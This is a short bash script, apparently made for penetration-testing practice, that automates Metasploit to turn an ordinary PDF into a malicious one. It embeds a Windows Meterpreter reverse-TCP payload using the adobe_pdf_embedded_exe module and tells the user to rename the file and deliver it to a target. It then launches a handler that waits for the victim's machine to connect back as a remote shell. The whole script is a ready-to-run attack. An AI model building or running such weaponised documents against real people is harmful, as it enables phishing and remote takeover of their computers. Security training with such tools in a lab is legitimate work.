#!/bin/bash

# Author: Matias Ayala
# Date Created: 31 Mar 2023
# Last Modified: 01 Apr 2023

# Description:
# This script automates the creation of a malicous PDF to listen for a meterpreter connection.  

# Usage:
# The customer will be prompted for an IP address for the IP address of the listening system
# The customer will also be prompted to provide a PDF file to copy for malicious PDF.
# Customer should run this in the directory where the PDF to be copied is located.

# Save IP address into variable lhost
read -p "Please enter the IP address of the VM you are using to listen for meterpreter: " lhost

echo " "

read -p "Please enter the filename of the PDF to be copied to the malicous PDF: " originalPDF

cp $originalPDF bad.pdf

echo "$originalPDF has been copied to bad.pdf in $PWD"

echo "Adding malicious payload to bad.pdf"

# Open Metasploit -q for quietly, and -x to execute command and run commands in order
msfconsole -q -x "use exploit/windows/fileformat/adobe_pdf_embedded_exe; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT 4444; set INFILENAME bad.pdf; set FILENAME bad.pdf; exploit; exit;"

echo "The PDF with the malicious payload is saved as bad.pdf and can be renamed and delivered to your target."; 
echo " "
echo " "

sleep 10s

echo "Setting up the handler to listen for the meterpreter connection to your target. Once your target opens the PDF you will see the connection.";


# Open Metasploit quietly and execute a handler to listen for meterpreter session once opened by target
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST $lhost; set LPORT 4444; exploit;"

